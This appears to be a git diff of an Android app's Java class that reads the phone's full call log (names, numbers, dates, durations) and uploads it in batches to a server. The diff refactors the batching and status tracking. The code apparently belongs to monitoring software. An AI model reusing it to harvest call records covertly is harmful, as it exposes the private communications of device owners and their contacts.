@@ -1,11 +1,10 @@
-package com.inet.android.archive;
+package com.inet.android.list;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
 import android.content.Context;
 import android.content.SharedPreferences;
-import android.content.SharedPreferences.Editor;
 import android.database.Cursor;
 import android.os.AsyncTask;
 import android.preference.PreferenceManager;
@@ -16,15 +15,15 @@ import com.inet.android.request.OnDemandRequest;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 
-public class ArchiveCall extends AsyncTask<Context, Void, Void> {
-	Context mContext;
-	RequestDataBaseHelper db;
-	private String iType = "1";;
+public class ListCall extends AsyncTask<Context, Void, Void> {
+	TurnSendList sendList;
 	ConvertDate date;
-	private String LOG_TAG = "ArchiveCall";
+	RequestDataBaseHelper db;
+	Context mContext;
+	private String iType = "1";;
+	private String LOG_TAG = "ListCall";
 	// private int type;
 	private String complete;
-	Editor ed;
 	SharedPreferences sp;
 
 	private String readCallLogs() {
@@ -32,7 +31,6 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 		String type = "0";
 		date = new ConvertDate();
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-		ed = sp.edit();
 
 		Logging.doLog(LOG_TAG,
 				"network" + sp.getBoolean("network_available", true), "network"
@@ -52,13 +50,13 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 				JSONObject archiveCallJson = new JSONObject();
 
 				// Проходим в цикле, пока не дойдём до последней записи
-				
+
 				while (callLogCursor.moveToNext()) {
-					
+
 					// Имя контакта
 					String name = callLogCursor.getString(callLogCursor
 							.getColumnIndex(CallLog.Calls.CACHED_NAME));
-					
+
 					String cacheNumber = callLogCursor.getString(callLogCursor
 							.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));
 					// Номер контакта и т.д.
@@ -69,13 +67,14 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 					// .getColumnIndex("address")))
 					long dateTimeMillis = callLogCursor.getLong(callLogCursor
 							.getColumnIndex(CallLog.Calls.DATE));
-//					long durationMillis = callLogCursor.getLong(callLogCursor
-//							.getColumnIndex(CallLog.Calls.DURATION));
+					// long durationMillis = callLogCursor.getLong(callLogCursor
+					// .getColumnIndex(CallLog.Calls.DURATION));
 					int callType = callLogCursor.getInt(callLogCursor
 							.getColumnIndex(CallLog.Calls.TYPE));
-					int durationInt = callLogCursor.getColumnIndex(CallLog.Calls.DURATION);
+					int durationInt = callLogCursor
+							.getColumnIndex(CallLog.Calls.DURATION);
 					String duration = callLogCursor.getString(durationInt);
-					
+
 					String dateString = date.getData(dateTimeMillis);
 
 					if (cacheNumber == null)
@@ -106,28 +105,35 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 						e.printStackTrace();
 					}
 					if (sendStr.length() >= 50000) {
-						Logging.doLog(LOG_TAG, "str >= 50000 ..",
-								"str >= 50000 ..");
-						sendRequest(sendStr, complete);
-						ed.putString("statusCallList", "1");
-						sendStr = null;
+						if (callLogCursor.isLast()) {
+							lastRaw(sendStr);
+							Logging.doLog(LOG_TAG, "str >= 50000 lastRaw",
+									"str >= 50000 lastRaw");
+						} else {
+							sendRequest(sendStr, complete);
+							sendStr = null;
+						}
 					}
 				}
-				complete = "1";
-				Logging.doLog(LOG_TAG, "Send complete 1 ..",
-						"Send complete 1 ..");
-				sendRequest(sendStr, complete);
-				sendStr = null;
-				ed.putString("statusCallList", "0");
-
+				if (sendStr != null) {
+					lastRaw(sendStr);
+				}
 				callLogCursor.close();
 			}
-		} else {
-			ed.putString("statusCallList", "1");
+		}else{
+			sendList = new TurnSendList(mContext);
+			sendList.setList(1, "1", "0");
 		}
-		ed.commit();
-
 		return null;
+	}
+
+	private void lastRaw(String sendStr) {
+		complete = "1";
+		Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 ..");
+		sendRequest(sendStr, complete);
+		sendStr = null;
+		sendList = new TurnSendList(mContext);
+		sendList.setList(1, "0", "0");
 	}
 
 	private void sendRequest(String str, String complete) {
